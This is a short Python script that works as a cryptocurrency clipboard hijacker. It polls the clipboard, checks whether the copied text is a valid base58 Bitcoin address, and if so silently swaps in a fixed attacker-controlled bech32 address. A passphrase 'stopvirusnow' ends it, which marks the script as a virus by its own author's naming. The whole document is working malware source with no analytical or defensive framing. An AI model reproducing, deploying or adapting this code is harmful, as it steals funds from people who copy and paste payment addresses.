import base58
import hashlib
import binascii
import pyperclip

def checker(address):
    bitcoinAddress = address
    if address == 'stopvirusnow':
        return 'stop'
    try: base58Decoder = base58.b58decode(bitcoinAddress).hex()
    except ValueError:
        return False
    prefixAndHash = base58Decoder[:len(base58Decoder)-8]
    checksum = base58Decoder[len(base58Decoder)-8:]
    hash = prefixAndHash
    for x in range(1,3):
        hash = hashlib.sha256(binascii.unhexlify(hash)).hexdigest()
    if(checksum == hash[:8]):
        return True
    else:
        print("[FALSE] checksum is not valid!")
        return False
while True:
    pyperclip.waitForNewPaste()
    clip = pyperclip.paste()
    print(clip)
    validity = checker(clip)
    if validity == 'stop':
        break
    if validity == True:
        pyperclip.copy('bc1qa6uyp90k5rxrz09uv8k45230clklu5ty3u7qc9')






